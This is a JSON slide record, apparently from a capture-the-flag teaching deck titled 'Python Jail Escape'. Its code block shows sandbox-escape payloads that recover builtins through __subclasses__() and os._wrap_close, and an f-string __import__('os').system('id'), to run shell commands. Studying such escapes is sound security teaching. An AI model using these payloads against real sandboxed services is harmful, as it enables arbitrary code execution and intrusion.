      "bgImage": "",
      "titleText": "Python Jail Escape",
      "titleColor": "#00ff41",
      "titleSize": 48,
      "subtitleText": "",
      "subtitleColor": "#2a6b3a",
      "bodyText": "The goal is usually to execute arbitrary code or read a file despite restrictions.",
      "bodyColor": "#7ab87a",
      "bodySize": 22,
      "bullets": [],
      "codeText": "# Common restricted globals/builtins\n# Bypass: recover __builtins__ from class hierarchy\n__builtins__ = {}    # common restriction\n\n# Get builtins back via subclasses\n().__class__.__mro__[-1].__subclasses__()\n\n# Find <class 'os._wrap_close'>\nimport_subclass = [c for c in ''.__class__.__mro__[-1].__subclasses__()\n                   if 'wrap_close' in str(c)][0]\nimport_subclass.__init__.__globals__['system']('id')\n\n# With f-strings in Python 3.12+\nf\"{ __import__('os').system('id') }\"\n\n# audit log bypass (CTF-specific, varies)",
      "codeLang": "python",
      "imageUrl": "",
      "showTitle": true,
      "showSubtitle": false,
      "showBody": true,
      "showBullets": false,
      "showCode": true,
      "showImage": false,
      "textAlign": "left",
